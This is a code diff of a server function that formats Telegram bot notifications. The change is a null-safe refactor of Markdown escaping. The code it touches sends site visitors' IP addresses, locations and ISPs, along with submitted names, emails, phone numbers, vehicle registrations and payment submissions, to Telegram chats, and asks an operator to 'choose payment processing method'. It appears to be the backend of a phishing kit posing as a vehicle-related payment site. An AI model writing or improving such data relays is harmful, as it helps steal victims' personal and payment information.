@@ -9,8 +9,10 @@ const corsHeaders = {
 
 // Helper function to escape special characters for Telegram MarkdownV2
 const escapeMarkdownV2 = (text: string) => {
-  return text.replace(/([_*\[\]()~`>#+=|{}.!-])/g, '\\$1');
+  return String(text).replace(/([_*\[\]()~`>#+=|{}.!-])/g, '\\$1');
 };
+// Safe wrapper that handles undefined/null by substituting 'Unknown'
+const em = (v: unknown) => escapeMarkdownV2(v ?? 'Unknown');
 
 interface TelegramSettings {
   bot_token: string;
@@ -106,31 +108,31 @@ serve(async (req) => {
     switch (type) {
       case 'user_info':
         message = `🔍 *New User Visit*\n\n` +
-          `👤 *User Agent:* ${escapeMarkdownV2(data.userAgent)}\n` +
-          `🌍 *IP:* ${escapeMarkdownV2(data.ip)}\n` +
-          `🏙️ *Location:* ${escapeMarkdownV2(data.city)}, ${escapeMarkdownV2(data.region)}, ${escapeMarkdownV2(data.country)}\n` +
-          `⏰ *Timezone:* ${escapeMarkdownV2(data.timezone)}\n` +
-          `🌐 *ISP:* ${escapeMarkdownV2(data.isp)}`;
+          `👤 *User Agent:* ${em(data.userAgent)}\n` +
+          `🌍 *IP:* ${em(data.ip)}\n` +
+          `🏙️ *Location:* ${em(data.city)}, ${em(data.region)}, ${em(data.country)}\n` +
+          `⏰ *Timezone:* ${em(data.timezone)}\n` +
+          `🌐 *ISP:* ${em(data.isp)}`;
         break;
 
       case 'form_submission':
         chatId = telegramSettings.form_chat_id; // Use form chat for submissions
         message = `💳 *New Form Submission*\n\n` +
-          `👤 *Name:* ${escapeMarkdownV2(data.name)}\n` +
-          `📧 *Email:* ${escapeMarkdownV2(data.email)}\n` +
-          `📱 *Phone:* ${escapeMarkdownV2(data.phone)}\n` +
-          `🚗 *Vehicle:* ${escapeMarkdownV2(data.vehicle_registration)}\n` +
-          `⏱️ *Duration:* ${escapeMarkdownV2(data.duration)}\n` +
-          `💰 *Price:* ${escapeMarkdownV2(data.price)}`;
+          `👤 *Name:* ${em(data.name)}\n` +
+          `📧 *Email:* ${em(data.email)}\n` +
+          `📱 *Phone:* ${em(data.phone)}\n` +
+          `🚗 *Vehicle:* ${em(data.vehicle_registration)}\n` +
+          `⏱️ *Duration:* ${em(data.duration)}\n` +
+          `💰 *Price:* ${em(data.price)}`;
         break;
 
       case 'vehicle_lookup':
         chatId = telegramSettings.form_chat_id; // Use form chat for vehicle lookups
         message = `🔍 *Vehicle Lookup*\n\n` +
-          `🚗 *Registration:* ${escapeMarkdownV2(data.registration)}\n` +
-          `🏢 *Make:* ${escapeMarkdownV2(data.make || 'Unknown')}\n` +
-          `🚙 *Model:* ${escapeMarkdownV2(data.model || 'Unknown')}\n` +
-          `🎨 *Color:* ${escapeMarkdownV2(data.color || 'Unknown')}`;
+          `🚗 *Registration:* ${em(data.registration)}\n` +
+          `🏢 *Make:* ${em(data.make)}\n` +
+          `🚙 *Model:* ${em(data.model)}\n` +
+          `🎨 *Color:* ${em(data.color)}`;
         break;
 
       case 'payment_submission':
@@ -177,16 +179,16 @@ serve(async (req) => {
         
         message = `💳 *PAYMENT PROCESSING REQUIRED* 💳\n\n` +
           `🆔 *User ID:* \`${data.userId}\`\n` +
-          `👤 *Customer:* ${escapeMarkdownV2(data.name)}\n` +
-          `📧 *Email:* ${escapeMarkdownV2(data.email)}\n` +
-          `📱 *Phone:* ${escapeMarkdownV2(data.phone)}\n\n` +
+          `👤 *Customer:* ${em(data.name)}\n` +
+          `📧 *Email:* ${em(data.email)}\n` +
+          `📱 *Phone:* ${em(data.phone)}\n\n` +
           `🚗 *Vehicle Details:*\n` +
-          `   • Registration: ${escapeMarkdownV2(data.vehicle_registration)}\n` +
-          `   • Make: ${escapeMarkdownV2(data.vehicle_make)}\n` +
-          `   • Model: ${escapeMarkdownV2(data.vehicle_model)}\n` +
-          `   • Color: ${escapeMarkdownV2(data.vehicle_color)}\n\n` +
-          `⏱️ *Duration:* ${escapeMarkdownV2(data.duration)}\n` +
-          `💰 *Price:* ${escapeMarkdownV2(data.price)}` +
+          `   • Registration: ${em(data.vehicle_registration)}\n` +
+          `   • Make: ${em(data.vehicle_make)}\n` +
+          `   • Model: ${em(data.vehicle_model)}\n` +
+          `   • Color: ${em(data.vehicle_color)}\n\n` +
+          `⏱️ *Duration:* ${em(data.duration)}\n` +
+          `💰 *Price:* ${em(data.price)}` +
           (paymentMethodText ? `${paymentMethodText}` : '') + (locationInfo ? `${locationInfo}` : '') + `\n\n` +
           `⚡ *Choose payment processing method:*`;
         
